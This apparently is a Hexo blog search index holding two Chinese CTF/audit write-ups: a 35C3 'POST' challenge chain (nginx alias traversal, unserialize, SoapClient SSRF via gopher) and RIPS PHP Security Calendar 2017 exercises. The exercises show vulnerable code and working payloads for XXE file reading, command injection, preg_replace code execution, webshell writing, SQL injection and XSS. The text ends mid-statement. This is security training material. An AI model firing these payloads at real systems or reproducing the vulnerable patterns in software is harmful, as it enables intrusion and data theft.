<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[35C3-POST WriteUp]]></title>
    <url>%2F2019%2F02%2F18%2F35C3-POST%20WriteUp%2F</url>
    <content type="text"><![CDATA[题目&amp;wp链接：https://github.com/eboda/35c3/tree/master/post 35C3-POSThint: flag is in dbHint2: the lovely XSS is part of the beautiful design and insignificant for the challengeHint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly. 功能点很简单，注册，登录，上传文件，评论。 测试了&lt; &gt;被实体编码，上传php文件不解析。 提示xss无用，nginx配置有问题，在Vulhub中提到了常见的nginx配置问题。 结合提示中的源码泄露，这里尝试nginx的alias配置不当导致目录穿越漏洞。整个过程就一个uploads目录,构造payload:http://50.3.232.201:8000/uploads../ 得到一个default.backup:123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; # 禁止直接访问 &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125;&#125; 说明8080端口还有另一个服务，即在/var/www/miniProxy目录下，直接访问http://50.3.232.201:8000/uploads../miniProxy/可以直接下载php源码，不会解析，这个页面的功能大概就是web的proxy。 此外，通过目录穿越可以下载到全部php源码。 源码基本浏览了一遍，加上提示，我们要拿到数据库里面的flag，在db.php的38行出中有一处反序列化操作unserialize()：而该函数的功能是将从数据库取出的数据进行反序列化操作，db.php的52行： 所以我们要想控制这个unserialize()函数，就得先往数据库里面插入我们的数据，55行: 全局搜索insert操作，共两处，一处注册，一处提交post数据。 post.php的41行： 全局搜索save()函数，在default.php的19行： save()函数中insert()，在db.php中的55行 再跟进DB::prepare_params()，db.php的18行: 这里中途对array_map()没理解好，卡了很久:http://php.net/manual/en/function.array-map.php 到这里，我们要传入一个$serializedobject$开头的字符串，才能使得查库操作时触发我们的unserialize()，但insert的时候过滤了这个字符串前缀，在官方的wp中提到，我们可以使用全角符号的unicode字符，mssql会自动转换，以$符号存入数据库中。 这里0xEF 0xBC 0x84会被mssql存储为$ 下面构造反序列化的攻击链：首先default.php 73行调用了post.php的63行,使用了query函数查询 同时在post.php中的Attachment类 控制$za属性传入soapClient类，使之在上图19行调用了open()方法，因为不存在，所以触发soapClient的__call方法(这里猜想有soap服务，另一个8080端口的服务暗示我们了ssrf，加上这里unserialize的利用功能点少) payload: $用brup的hex修改 8080端口服务只允许get型数据，但是从其服务中来看我们要用post型去打内网数据库，所以这里就利用soapclient的clrf发起get请求，gopher模拟post]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP SECURITY CALENDAR 2017]]></title>
    <url>%2F2019%2F02%2F14%2FPHP%20SECURITY%20CALENDAR%202017%2F</url>
    <content type="text"><![CDATA[Day 1 - Wish List考点：in_array()未配置第三个参数，导致弱类型绕过题目源码：123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &apos;./solutions/&apos;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&apos;tmp_name&apos;], self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&apos;solution&apos;]); 大致的逻辑为上传一个表单name=solution的文件，验证其文件名在range(1,24)的范围，使用的in_array()来进行验证。 问题就出在in_array()函数：http://php.net/manual/zh/function.in-array.php 文档中写道，如果没有使用第三个参数$strick=true，则使用弱类型比较，即前先进行类型转换再比较。即我们构造一个文件名为1a.php,经过in_array()的类型转换会变成1从而绕过这个限制。 demo:123456&lt;?php$array = range(1,24);$file_name = &quot;1a.php&quot;;if(in_array($file_name, $array))&#123; var_dump(in_array($file_name, $array));&#125; 红日安全提供的一道练习题：https://xz.aliyun.com/t/2451这里用make_set函数绕group，然后报错注入。 没过滤sleep，if，mid盲注也行 Day 2 - Twig考点：filter_var的url验证绕过题目源码：123456789101112131415161718192021222324252627282930313233// composer require &quot;twig/twig&quot;require &apos;vendor/autoload.php&apos;;class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = &apos;&lt;img &apos; . &apos;src=&quot;https://loremflickr.com/320/240&quot;&gt;&apos; . &apos;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&apos;; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\Loader\ArrayLoader([ &apos;index.html&apos; =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET[&apos;nextSlide&apos;]; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( &apos;index.html&apos;, [&apos;link&apos; =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render(); 两个过滤点，一个是twig模板引擎自带的escape过滤：https://twig.symfony.com/ 也就是htmlspecialchars实现的过滤。12345&amp; (&amp; 符号) =============== &amp;amp;&quot; (双引号) =============== &amp;quot;&apos; (单引号) =============== &amp;apos;&lt; (小于号) =============== &amp;lt;&gt; (大于号) =============== &amp;gt; 第二个点：filter_var($nextSlide, FILTER_VALIDATE_URL)，检测是否为一个合法的url。 这里给出的payload：?url=javascript://comment％250aalert(1)即%25-&gt;%,%0a-&gt;换行符，二次url编码，第一次为传入时浏览器接码一次，第二次为解析时，浏览器解码换行符。所以JavaScript伪协议和换行绕过了这个限制。 红日安全提供的一个练习题：https://xz.aliyun.com/t/2491显然这里不是考察orange的parse_url函数和curl处理host的差异，这里要求我们parse_url处理后的host以规定的域名结尾，所以我们可控的就是前面， 这里测试的php版本为5.5： 简单测试了一下filter_var的url合法检测情况(爆破的时候记得将brup的自动url编码关掉) 其实这里漏了一个%23，没有#锚点的特殊功能，单纯只是一个字符#url=http://demo.com%23sec-redclub.com 还有换成别的协议还能用分号绕过,这一步在命令执行里面很关键：?url=demo://demo.com;sec-redclub.com 再来看看着如何绕过第二步parse_url($url)[&#39;host&#39;]的正则匹配：url=demo://demo.com;ls;sec-redclub.com 进一步构造： payload:?url=demo://aa&quot;;ls;&quot;sec-redclub.com 读flag：?url=demo://aa&quot;;cat${IFS}f1agi3hEre.php;&quot;sec-redclub.com Day 3 - Snow Flake题目源码：12345678910111213141516171819202122232425262728293031function __autoload($className) &#123; include $className;&#125;$controllerName = $_GET[&apos;c&apos;];$data = $_GET[&apos;d&apos;];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data[&apos;t&apos;], $data[&apos;v&apos;]); $controller-&gt;render();&#125; else &#123; echo &apos;There is no page with this name&apos;;&#125;class HomeController &#123; private $template; private $variables; public function __construct($template, $variables) &#123; $this-&gt;template = $template; $this-&gt;variables = $variables; &#125; public function render() &#123; if ($this-&gt;variables[&apos;new&apos;]) &#123; echo &apos;controller rendering new response&apos;; &#125; else &#123; echo &apos;controller rendering old response&apos;; &#125; &#125;&#125; 初看源码其实并不知道哪有漏洞，可控的点操作的东西小很少，而且也没有输出的地方。 可以看到文档中写到class_exists()的用法：http://php.net/manual/zh/function.class-exists.php 默认是类不存在时调用__autoload()函数的 文档中写到，__autoload()在php7.2已经废弃，取而代之的是spl_autoload_register() 还有一些会自动调用__autoload()函数的函数1234567891011121314151617call_user_func()call_user_func_array()class_exists()class_implements()class_parents()class_uses()get_class_methods()get_class_vars()get_parent_class()interface_exists()is_a()is_callable()is_subclass_of()method_exists()property_exists()spl_autoload_call()trait_exists() 然而的是PHP5~5.3才能用.符号，在php5.4修复了这个问题，所以既不能目录穿越，也不能 包含当前目录下的.php等文件。 第二个漏洞产生的原因就是因为类名和其实例化传入的参数可控，导致我们可以控制php内部存在漏洞的类。 exp demo:12345678910111213141516&lt;?php# 让php允许外部实体libxml_disable_entity_loader(false);$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT | LIBXML_DTDLOAD);var_dump($xml_class);// LIBXML_NOENT: 将xml实体引用替换成对应的值// LIBXML_DTDLOAD: 加载DOCTYPE中的DTD文件 payload:1/?c=SimpleXMLElement&amp;d[v]=2&amp;d[t]=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; 挺疑惑SimpleXMLElement第二个参数给2的原因.. 把结果输出出来了，这里得盲打xxe,这里挖个坑，以后再填。 下面来看一下红日安全提供的审计题：index.php12345678910111213141516171819202122&lt;?phpclass NotFound&#123; function __construct() &#123; die(&apos;404&apos;); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET[&apos;name&apos;]) ? $_GET[&apos;name&apos;] : null;$param = isset($_GET[&apos;param&apos;]) ? $_GET[&apos;param&apos;] : null;$param2 = isset($_GET[&apos;param2&apos;]) ? $_GET[&apos;param2&apos;] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.&apos;=&gt;&apos;.$value.&apos;&lt;br&gt;&apos;;&#125; 这里使用的是spl_autoload_register()函数，简而言之是__autoload()的升级版，给autoload创建一个队列，逐个执行。参数如下： 解题思路：先使用内置类:GlobIterator,其构造函数用法：这样就可以搜索文件位置： 找flag位置：name=GlobIterator&amp;param=*.php&amp;param2=0 这里读取flag要使用php文件流的原因是因为xxe读取的文件中如果存在&lt;&gt;&#39;&quot;&amp;就会导致xml文件解析错误，所以就只能这样通过流的方式base64编码读出。 读flag：1name=SimpleXMLElement&amp;param2=2&amp;param=&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+ANY+[&lt;!ENTITY+xxe+SYSTEM+&quot;php%3a//filter/read%3dconvert.base64-encode/resource%3d/Users/passer6y/Documents/ctf/phpAuditLabs/day3_class_exists/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe%3b&lt;/x&gt; Day 4 - False Beard123456789101112131415161718192021class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp; (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;)) ) &#123; $format = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&apos; . &apos;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&apos;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]); 去翻一下strpos的文档，里面也明确说明了这个问题，该函数返回查询字符首次出现的数字位置，如果在第一个字符位置则返回0，如果使用弱类型比较，则可能导致安全漏洞。 红日安全提供的练习题，在api.php将用户的每一位数字和开奖的数字进行比较，相同位数越多则得到的奖金越多。 使用的弱类型比较，如果从布尔型的角度想来，除了0,false,null其他都为真，则我们构造一个数组使其都为真即可： Day 5 - postcard12345678910111213141516171819202122232425262728293031323334353637class Mailer &#123; private function sanitize($email) &#123; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; return &apos;&apos;; &#125; return escapeshellarg($email); &#125; public function send($data) &#123; if (!isset($data[&apos;to&apos;])) &#123; $data[&apos;to&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;to&apos;] = $this-&gt;sanitize($data[&apos;to&apos;]); &#125; if (!isset($data[&apos;from&apos;])) &#123; $data[&apos;from&apos;] = &apos;none@ripstech.com&apos;; &#125; else &#123; $data[&apos;from&apos;] = $this-&gt;sanitize($data[&apos;from&apos;]); &#125; if (!isset($data[&apos;subject&apos;])) &#123; $data[&apos;subject&apos;] = &apos;No Subject&apos;; &#125; if (!isset($data[&apos;message&apos;])) &#123; $data[&apos;message&apos;] = &apos;&apos;; &#125; mail($data[&apos;to&apos;], $data[&apos;subject&apos;], $data[&apos;message&apos;], &apos;&apos;, &quot;-f&quot; . $data[&apos;from&apos;]); &#125;&#125;$mailer = new Mailer();$mailer-&gt;send($_POST); Day6 - Forst Pattern123456789101112131415161718192021222324252627class TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case &apos;create&apos;: $this-&gt;createToken($data); break; case &apos;delete&apos;: $this-&gt;clearToken($data); break; default: throw new Exception(&apos;Unknown action&apos;); &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents(&apos;/tmp/tokens/&apos; . $token, &apos;...data&apos;); &#125; public function clearToken($token) &#123; $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token); unlink(&apos;/tmp/tokens/&apos; . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET[&apos;action&apos;], $_GET[&apos;data&apos;]); 关键点在preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);将非从a-z,.-_替换为空，过滤不严，导致可以使用../../导致任意文件删除。 红日的练习题wp：1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude &apos;flag.php&apos;;if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])&#123; $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) // [[:graph:]] ：匹配所有的可打印字符，等价于[^ \t\n\r\f\v] &#123; echo &apos;Wrong Format&apos;; exit; &#125; while (TRUE) &#123; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; // 小写 大写 标点 数字 if (6 &gt; preg_match_all($reg, $password, $arr))&#123; echo &quot;step2:&quot;.preg_match_all($reg, $password, $arr); break; &#125; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3)&#123; echo &quot;step3:&quot;.$c; break; &#125; if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; &#125;&#125;highlight_file(__FILE__);?&gt; 使用科学计数法绕：payload：12password=42.00e%2b00000000000 password=420.000000e-1 加号注意要url编码，不然是空白字符，在burp的params中可以看到不编码的参数： Day 7 - Bell考察的parse_str没有配置第二个参数导致变量覆盖。123456789101112131415161718192021222324&lt;?phpfunction getUser($id) &#123;global $config, $db;if (!is_resource($db)) &#123; $db = new MySQLi( $config[&apos;dbhost&apos;], $config[&apos;dbuser&apos;], $config[&apos;dbpass&apos;], $config[&apos;dbname&apos;] );&#125;$sql = &quot;SELECT username FROM users WHERE id = ?&quot;;$stmt = $db-&gt;prepare($sql);$stmt-&gt;bind_param(&apos;i&apos;, $id);$stmt-&gt;bind_result($name);$stmt-&gt;execute();$stmt-&gt;fetch();return $name;&#125;$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);parse_str($var[&apos;query&apos;]);$currentUser = getUser($id);echo &apos;&lt;h1&gt;&apos;.htmlspecialchars($currentUser).&apos;&lt;/h1&gt;&apos;; 漏洞点在parse_str($var[&#39;query&#39;]);，其变量覆盖导致可以被修改mysql数据库配置，让其连上我们的数据库然后绕过权限验证。 漏洞产生的原因为没有设置第二个参数，即将结果存入result，而是直接将变量解析到当前作用域 demo： 同样产生变量覆盖的问题还有：$$产生变量覆盖 1234567&lt;?php$a = 1;$k = $_GET[&apos;k&apos;];$v = $_GET[&apos;v&apos;];$$k = $v;echo $a;// 修复办法即注册变量前检测是否变量已存在 以及extract() 12345&lt;?php$a = 1;extract(array(&quot;a&quot;=&gt;&quot;3&quot;));//修复：extract(array(&quot;a&quot;=&gt;&quot;3&quot;),EXTR_SKIP);echo $a; 红日安全提供的练习题：https://xz.aliyun.com/t/2541 第一关parse_str变量覆盖，弱类型比较绕过 第二关条件竞争，利用0.1秒时间差，一个疯狂生成文件，一个调大线程去访问即可。 其实测试了一下这里不加usleep函数也能成功拿到flag，只是概率小了一些而已 Day 8 - Candle考察：preg_replace()e修饰符代码执行1234567891011121314&lt;?phpheader(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\n&quot;;&#125; preg_replace()e修饰符，第二个参数可造成代码执行这里由于第二个参数用的双引号，可导致{${phpinfo()}}该特殊的可变变量被执行。 正则的反向引用：https://xz.aliyun.com/t/2557 关于反向引用的理解：https://blog.csdn.net/lxcnn/article/details/4146148https://blog.csdn.net/lxcnn/article/details/4476746 payload：http://127.0.0.1/?\S*={${phpinfo()}} Day 9 - Rabbit考察str_replace()过滤不严123456789101112131415161718class LanguageManager &#123; public function loadLanguage() &#123; $lang = $this-&gt;getBrowserLanguage(); $sanitizedLang = $this-&gt;sanitizeLanguage($lang); require_once(&quot;/lang/$sanitizedLang&quot;); &#125; private function getBrowserLanguage() &#123; $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;en&apos;; return $lang; &#125; private function sanitizeLanguage($language) &#123; return str_replace(&apos;../&apos;, &apos;&apos;, $language); &#125;&#125;(new LanguageManager())-&gt;loadLanguage(); payload：..././或....// 如果过滤方式为:str_replace(array(&#39;../&#39;,&#39;./&#39;), &#39;&#39;, $dir);我们可以构造这样的payload：.....///=&gt;../来进行目录遍历 修复方案：可以使用递归的过滤，或者：str_replace(&#39;..&#39;, &#39;&#39;, $language) 红日安全提供的ctf题目：https://xz.aliyun.com/t/2633利用变量覆盖绕过addslashes的引号限制从而导致注入： Day 10 - Anticipation1234567891011121314151617&lt;?phpextract($_POST);function goAway() &#123; error_log(&quot;Hacking attempt.&quot;); header(&apos;Location: /error/&apos;);&#125;if (!isset($pi) || !is_numeric($pi)) &#123; goAway();&#125;if (!assert(&quot;(int)$pi == 3&quot;)) &#123; echo &quot;This is not pi.&quot;;&#125; else &#123; echo &quot;This might be pi.&quot;;&#125; 程序未exit()，加上变量覆盖导致代码执行。payload:pi=phpinfo() Day 12 - String Lights1234567891011121314$sanitized = [];foreach ($_GET as $key =&gt; $value) &#123; $sanitized[$key] = intval($value);&#125;$queryParts = array_map(function ($key, $value) &#123; return $key . &apos;=&apos; . $value;&#125;, array_keys($sanitized), array_values($sanitized));$query = implode(&apos;&amp;&apos;, $queryParts);echo &quot;&lt;a href=&apos;/images/size.php?&quot; . htmlentities($query) . &quot;&apos;&gt;link&lt;/a&gt;&quot;; htmlentities函数使用不当，加上intval只对数组的值进行转换，没有对键进行转换，导致xss。 htmlentities：功能即编码一些特殊符号 但是第二个参数的默认配置会不编码单引号，这就导致了这里单引号被闭合 payload:?a&#39;onclick=alert(1)//=c 红日安全提供的ctf题：https://github.com/hongriSec/PHP-Audit-Labs/tree/master/Part1/Day12/files1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phprequire &apos;db.inc.php&apos;;if(isset($_REQUEST[&apos;username&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;username&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;if(isset($_REQUEST[&apos;password&apos;]))&#123; if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&apos;password&apos;]))&#123; die(&quot;Attack detected!!!&quot;); &#125;&#125;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;echo $query;$result=mysql_query($query,$con);//var_dump($result);while($row = mysql_fetch_array($result))&#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;;&#125;?&gt; 和之前不一样的是，这里同样用了htmlentities进行编码转换，这里配置了ENT_QUOTES，使得单双引号都会被转义，无法闭合sql语句。但是因为没有过滤\，使得我们可以转义单引号： 后来看wp还有一种有意思思路：https://xz.aliyun.com/t/2829#toc-4 仔细看我们会发现过滤的时候使用的是$_REQUEST来获取参数，而获取查库操作的变量以$_GET形式引入，这里有一个看似不起眼的差异。 在php.ini中，因为$_REQUEST和gpc有共同之处，而下图中GPCS即$_REQUEST加载流程,G:Get，P:Post，C:Cookie，S:Server。 可以知道post在get之后，如果我们同时传入get和post相同参数，则$_REQUEST获取到的是post，固然我们就可以利用这个点绕过过滤限制。 Day 13 - Turkey Baster123456789101112131415161718192021222324252627282930313233343536class LoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $user = $this-&gt;sanitizeInput($this-&gt;user); $pass = $this-&gt;sanitizeInput($this-&gt;password); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(&quot;COUNT(p)&quot;) -&gt;from(&quot;User&quot;, &quot;u&quot;) -&gt;where(&quot;user = &apos;$user&apos; AND password = &apos;$pass&apos;&quot;); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input; &#125;&#125;$auth = new LoginManager($_POST[&apos;user&apos;], $_POST[&apos;passwd&apos;]);if (!$auth-&gt;isValid()) &#123; exit;&#125; 其实这个点和day12有相似之处，这段代码虽然使用了addslashes()函数来转义引号，问题出在他会用substr()截断长度大于20的部分，所以我们可以像day12中一样，利用substr将\&#39;的&#39;给截断掉，导致转义原本的单引号，然后就可以注入了。当然这类漏洞局限就是一般存在于双条件查询的页面。 红日安全提供的练习题：https://xz.aliyun.com/t/2864 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phprequire &apos;db.inc.php&apos;; function dhtmlspecialchars($string) &#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = dhtmlspecialchars($val); &#125; &#125; else &#123; $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;(&apos;, &apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;, &apos;（&apos;, &apos;）&apos;), $string); if (strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123; $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string); &#125; &#125; return $string; &#125; function dowith_sql($str) &#123; $check = preg_match(&apos;/select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&apos;, $str); if ($check) &#123; echo &quot;非法字符!&quot;; exit(); &#125; return $str; &#125; // 经过第一个waf处理 foreach ($_REQUEST as $key =&gt; $value) &#123; $_REQUEST[$key] = dowith_sql($value); // 用相同参数的$_POST去覆盖掉$_GET &#125; // 经过第二个WAF处理 $request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]); // 这里拿到的是$_GET if (isset($request_uri[1])) &#123; $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]); foreach ($rewrite_url as $key =&gt; $value) &#123; $_value = explode(&quot;=&quot;, $value); if (isset($_value[1])) &#123; $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1])); // 没过滤键，只过滤了value &#125; &#125; &#125; // 业务处理 if (isset($_REQUEST[&apos;submit&apos;])) &#123; $user_id = $_REQUEST[&apos;i_d&apos;]; $sql = &quot;select * from phpAuditLabs.users where id=$user_id&quot;; echo $sql; $result=mysql_query($sql); while($row = mysql_fetch_array($result)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot; . $row[&apos;name&apos;] . &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; &#125;?&gt; 同样也是$_REQUEST获取参数覆盖问题同day12，相同参数名时$_POST会覆盖掉$_GET，而在其处理$_SERVER[&#39;REQUEST_URI&#39;]再一次对uri中的参数给$_REQUEST进行注册，并且没有校验sql注入。 这里还有一种解法就是利用http参数污染漏洞，思路和day14一致。 Day 14 - Snowman考点：变量覆盖及目录遍历getshell 123456789101112131415161718192021222324&lt;?phpclass Carrot &#123;const EXTERNAL_DIRECTORY = &apos;/tmp/&apos;;private $id;private $lost = 0;private $bought = 0;public function __construct($input) &#123;$this-&gt;id = rand(1, 1000);foreach ($input as $field =&gt; $count) &#123;$this-&gt;$field = $count++;&#125;&#125;public function __destruct() &#123;file_put_contents(self::EXTERNAL_DIRECTORY . $this-&gt;id,var_export(get_object_vars($this), true));&#125;&#125;$carrot = new Carrot($_GET); payload:../11.php&amp;shell=1&#39;,)%0a&lt;%3fphp+phpinfo();?&gt;// 红日安全提供的ctf题： https://pan.baidu.com/s/1pHjOVK0Ib-tjztkgBxe3nQ 密码: 59t2 这个题的漏洞关键在于$_SERVER[&#39;REQUEST_URI&#39;]和$_GET处理空格、.、[的差异造成。 $_GET变量在处理参数的时候，会将参数名中的空格、.、[替换成_，而$_SERVER[&#39;REQUEST_URI&#39;]不会，这就在注册变量的时候产生了一个差异。这种漏洞称为HPP（HTTP Parameter Pollution）demo: payload:?message_id=-1 union select 1,flag,3,4 from flag&amp;message.id=1 嫖的原理图： Day 15 - Sleigh Ride $_SERVER[&#39;PHP_SELF&#39;]配合一些特殊的url解析模式(如PATH_INFO)导致的漏洞 1234567891011121314151617181920212223class Redirect &#123; private $websiteHost = &apos;www.example.com&apos;; private function setHeaders($url) &#123; $url = urldecode($url); header(&quot;Location: $url&quot;); &#125; public function startRedirect($params) &#123; $parts = explode(&apos;/&apos;, $_SERVER[&apos;PHP_SELF&apos;]); $baseFile = end($parts); $url = sprintf( &quot;%s?%s&quot;, $baseFile, http_build_query($params) ); $this-&gt;setHeaders($url); &#125;&#125;if ($_GET[&apos;redirect&apos;]) &#123; (new Redirect())-&gt;startRedirect($_GET[&apos;params&apos;]);&#125; 这里如果URL是PATH_INFO的时候，比如http://demo.com/index.php/admin实际上还是访问的index.php这样的入口文件。比如：http://demo.com/index.php/http://baidu.com，$_SERVER[&#39;PHP_SELF&#39;]获取到的是/index.php/http://baidu.com，而这里会explode处理/，取数组的最后一个作为 $baseFile，由于代码中设置header()前有一次url解码，这就导致了我们可以二次url编码绕过这个/限制，payload：http://demo.com/index.php/http:%252f%252fbaidu.com?redirect=1&amp;params[a]=1 这样就产生了一个url跳转漏洞。 红日安全提供的ctf题：https://xz.aliyun.com/t/3178 1234567891011121314151617181920212223242526272829&lt;?php include &quot;./config.php&quot;;include &quot;./flag.php&quot;;error_reporting(0);$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); if(preg_match($black_list, $_GET[&apos;pwd&apos;])) exit(&quot;:P&quot;); $query=&quot;select user from users where user=&apos;$_GET[user]&apos; and pwd=&apos;$_GET[pwd]&apos;&quot;;echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$row[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;;&#125;$result = $conn-&gt;query(&quot;select pwd from users where user=&apos;admin&apos;&quot;);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = 